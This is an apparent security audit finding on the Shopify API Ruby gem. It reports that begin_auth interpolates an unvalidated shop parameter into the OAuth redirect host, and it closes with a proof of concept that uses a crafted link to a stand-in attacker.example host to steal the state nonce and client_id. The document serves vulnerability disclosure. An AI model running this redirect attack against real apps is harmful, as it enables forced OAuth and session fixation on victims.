Confirmed: `HttpClient#initialize` builds `@base_uri = "https://#{api_host || session.shop}"` directly from `session.shop` [1](#0-0) , and when `validate_auth_callback` runs the token exchange it constructs `null_session = Auth::Session.new(shop: auth_query.shop)` where `auth_query.shop` is only trustworthy because it is covered by the OAuth HMAC (`code`, `host`, `shop`, `state`, `timestamp` are all in `to_signable_string`) [2](#0-1) [3](#0-2) . That path is safe since the HMAC binds `shop` and only Shopify holds the secret.

However, `begin_auth` has no such protection: it calls `auth_base_uri(shop)`, which does `"https://#{shop}/admin"` with zero validation [4](#0-3) , and `begin_auth` itself never calls `Utils::ShopValidator.sanitize!` on `shop` before building the redirect URL [5](#0-4) . This is inconsistent with `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token`, which all sanitize `shop` via `Utils::ShopValidator.sanitize!` before using it to build a request host [6](#0-5) [7](#0-6) [8](#0-7) . `ShopValidator` exists precisely to restrict shop hosts to `TRUSTED_SHOPIFY_DOMAINS` [9](#0-8) , but it is not applied in `begin_auth`.

### Title
Unvalidated `shop` parameter in `Oauth.begin_auth` enables host injection, leaking `client_id`/scope/state nonce and enabling forced OAuth / session fixation - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` builds the authorization redirect URL as `"https://#{shop}/admin/oauth/authorize?..."` using the caller-supplied `shop` value with no validation via `Utils::ShopValidator`, unlike every other OAuth-adjacent entry point in the gem (`ClientCredentials`, `RefreshToken`, `TokenExchange.migrate_to_expiring_token`).

### Finding Description
`begin_auth(shop:, redirect_path:, ...)` is the very first step of the OAuth flow and is normally invoked directly from an unauthenticated request parameter (e.g. a `?shop=` query string on the app's login route), before any Shopify-issued HMAC exists to bind that value. The method computes:
```ruby
auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"
```
and
```ruby
def auth_base_uri(shop)
  return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")
  ...
end
``` [4](#0-3) 

`shop` is interpolated straight into the destination host with no call to `Utils::ShopValidator.sanitize!`, so it is not constrained to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) [9](#0-8) . The equality that should hold — "the host the browser is redirected to" == "a Shopify-trusted domain" — is not enforced here, breaking the same binding that `ShopValidator` was introduced to guarantee elsewhere in the gem.

`query_string` embeds `client_id` (the app's public client identifier), the requested OAuth `scope`, the app's own `redirect_uri`, and — critically — the CSRF `state` nonce that was just written into the victim's browser cookie (`SessionCookie.new(value: state, ...)`) [10](#0-9) . If `shop` is attacker-controlled, all of this is sent to an attacker-chosen origin instead of Shopify.

### Impact Explanation
This is a host-binding failure that directly maps to the report's "session fixation or forced OAuth completion" High-severity category: the app's redirect target is not verified to be an authentic Shopify domain, and the state nonce, tied to the victim's session cookie, is disclosed to an attacker-controlled host. An attacker can leverage this to force the victim's browser to complete OAuth against a shop the attacker controls, potentially fixating the victim's app session onto the attacker's Shopify store, and it also leaks the app's `client_id`/scope to a third party. It does not by itself leak `client_secret` or an access token (those are exchanged in `validate_auth_callback`, whose `shop` value is protected by the OAuth HMAC), keeping this below Critical.

### Likelihood Explanation
`begin_auth` is documented and expected to be called with a shop value taken from the initial, unauthenticated request into the app (see the `docs/usage/oauth.md` example using `request.headers["Shop"]`) [11](#0-10) , so any host application that passes the raw incoming shop parameter through — which is the flow the library itself documents — is exposed. No special privileges, tokens, or secrets are required by the attacker; a single crafted link to the app's login endpoint is sufficient.

### Recommendation
Validate and normalize `shop` with `Utils::ShopValidator.sanitize!` at the start of `begin_auth` (and ideally also defensively in `validate_auth_callback`), mirroring the pattern already used in `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token`, raising `Errors::InvalidShopError` for any shop that does not resolve to a `TRUSTED_SHOPIFY_DOMAINS` host before it is used to build `auth_base_uri`.

### Proof of Concept
1. Host app exposes `GET /login?shop=<value>` which calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/auth/callback")`, per the documented pattern [11](#0-10) .
2. Attacker sends victim a link: `https://legit-app.example/login?shop=attacker.example`.
3. `begin_auth` computes `auth_route = "https://attacker.example/admin/oauth/authorize?client_id=<APP_CLIENT_ID>&scope=<SCOPES>&redirect_uri=https://legit-app.example/auth/callback&state=<NONCE>"` via `auth_base_uri("attacker.example")` [12](#0-11) , and the app sets the `state` value in the victim's browser cookie and redirects to that URL.
4. Attacker's server at `attacker.example` receives `client_id`, `scope`, `redirect_uri`, and the victim's `state` nonce, and can subsequently drive the victim's browser to complete OAuth against a Shopify store the attacker controls while presenting the leaked `state`, fixating the victim's client-side OAuth session/cookie against the attacker's shop.
